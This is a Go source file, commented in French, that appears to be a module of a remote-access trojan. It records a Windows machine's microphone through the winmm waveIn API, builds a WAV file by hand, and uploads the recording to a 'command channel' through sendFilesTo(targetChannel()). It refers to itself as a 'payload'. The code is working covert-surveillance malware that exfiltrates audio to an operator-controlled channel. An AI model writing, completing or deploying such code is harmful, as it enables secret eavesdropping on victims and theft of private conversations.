// mic.go — enregistrement du microphone en WAV, sans dépendance.
//
// winmm (waveIn) capture du PCM 16 bits mono ; on écrit l'en-tête RIFF à la
// main. Aucun codec, aucun ffmpeg : le fichier s'ouvre partout.
package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"os"
	"syscall"
	"time"
	"unsafe"
)

var (
	winmmDLL            = syscall.NewLazyDLL("winmm.dll")
	procWaveInOpen      = winmmDLL.NewProc("waveInOpen")
	procWaveInPrepare   = winmmDLL.NewProc("waveInPrepareHeader")
	procWaveInUnprepare = winmmDLL.NewProc("waveInUnprepareHeader")
	procWaveInAddBuffer = winmmDLL.NewProc("waveInAddBuffer")
	procWaveInStart     = winmmDLL.NewProc("waveInStart")
	procWaveInStop      = winmmDLL.NewProc("waveInStop")
	procWaveInReset     = winmmDLL.NewProc("waveInReset")
	procWaveInClose     = winmmDLL.NewProc("waveInClose")
)

type waveFormatEx struct {
	FormatTag      uint16
	Channels       uint16
	SamplesPerSec  uint32
	AvgBytesPerSec uint32
	BlockAlign     uint16
	BitsPerSample  uint16
	CbSize         uint16
}

type waveHdr struct {
	Data          uintptr
	BufferLength  uint32
	BytesRecorded uint32
	User          uintptr
	Flags         uint32
	Loops         uint32
	Next          uintptr
	Reserved      uintptr
}

const (
	waveMapper    = 0xFFFFFFFF
	waveFormatPCM = 1
)

// recordMic capture `seconds` de son et rend les octets PCM.
func recordMic(seconds int) ([]byte, int, error) {
	if seconds < 1 {
		seconds = 5
	}
	if seconds > 120 {
		seconds = 120
	}
	const rate = 16000
	const bits = 16
	const channels = 1
	var hwi uintptr

	wf := waveFormatEx{
		FormatTag:      waveFormatPCM,
		Channels:       channels,
		SamplesPerSec:  rate,
		AvgBytesPerSec: rate * channels * bits / 8,
		BlockAlign:     channels * bits / 8,
		BitsPerSample:  bits,
	}
	r, _, _ := procWaveInOpen.Call(uintptr(unsafe.Pointer(&hwi)), waveMapper,
		uintptr(unsafe.Pointer(&wf)), 0, 0, 0)
	if r != 0 {
		return nil, 0, fmt.Errorf("micro indisponible (code %d)", r)
	}
	defer procWaveInClose.Call(hwi)

	// Tampon unique de la durée demandée : plus simple qu'un anneau, et la
	// mémoire reste raisonnable à 16 kHz mono.
	size := rate * channels * bits / 8 * seconds
	buf := make([]byte, size)
	hdr := waveHdr{
		Data:         uintptr(unsafe.Pointer(&buf[0])),
		BufferLength: uint32(size),
	}
	if r, _, _ := procWaveInPrepare.Call(hwi, uintptr(unsafe.Pointer(&hdr)), unsafe.Sizeof(hdr)); r != 0 {
		return nil, 0, fmt.Errorf("préparation tampon (code %d)", r)
	}
	defer procWaveInUnprepare.Call(hwi, uintptr(unsafe.Pointer(&hdr)), unsafe.Sizeof(hdr))

	if r, _, _ := procWaveInAddBuffer.Call(hwi, uintptr(unsafe.Pointer(&hdr)), unsafe.Sizeof(hdr)); r != 0 {
		return nil, 0, fmt.Errorf("file d'enregistrement (code %d)", r)
	}
	if r, _, _ := procWaveInStart.Call(hwi); r != 0 {
		return nil, 0, fmt.Errorf("démarrage (code %d)", r)
	}

	deadline := time.Now().Add(time.Duration(seconds) * time.Second)
	for time.Now().Before(deadline) {
		if hdr.Flags&0x10 != 0 { // WHDR_DONE
			break
		}
		time.Sleep(100 * time.Millisecond)
		if stopped.Load() {
			break
		}
	}
	procWaveInStop.Call(hwi)
	procWaveInReset.Call(hwi)

	n := int(hdr.BytesRecorded)
	if n > size {
		n = size
	}
	return buf[:n], rate, nil
}

// wavFile emballe du PCM dans un fichier WAV lisible.
func wavFile(pcm []byte, rate int) []byte {
	var b bytes.Buffer
	dataLen := len(pcm)
	riffLen := 36 + dataLen
	b.WriteString("RIFF")
	binary.Write(&b, binary.LittleEndian, uint32(riffLen))
	b.WriteString("WAVEfmt ")
	binary.Write(&b, binary.LittleEndian, uint32(16))
	binary.Write(&b, binary.LittleEndian, uint16(waveFormatPCM))
	binary.Write(&b, binary.LittleEndian, uint16(1)) // mono
	binary.Write(&b, binary.LittleEndian, uint32(rate))
	binary.Write(&b, binary.LittleEndian, uint32(rate*2))
	binary.Write(&b, binary.LittleEndian, uint16(2))
	binary.Write(&b, binary.LittleEndian, uint16(16))
	b.WriteString("data")
	binary.Write(&b, binary.LittleEndian, uint32(dataLen))
	b.Write(pcm)
	return b.Bytes()
}

// micRecord enregistre et envoie le fichier dans le salon de commande.
func micRecord(seconds int) string {
	if stopped.Load() {
		return "payload arrêté."
	}
	pcm, rate, err := recordMic(seconds)
	if err != nil {
		return "microphone : " + err.Error()
	}
	if len(pcm) < rate/2 {
		return "microphone : rien capté (périphérique muet ou absent)."
	}
	data := wavFile(pcm, rate)
	name := fmt.Sprintf("mic-%s.wav", time.Now().Format("060102-150405"))
	if len(data) > 8*1024*1024 {
		return "enregistrement trop lourd (réduis la durée)."
	}
	_ = os.WriteFile(workPath(name), data, 0600)
	sendFilesTo(targetChannel(), fileOut{Name: name, Data: data})
	return fmt.Sprintf("audio envoyé : %s (%d s, %d Ko).", name, seconds, len(data)/1024)
}
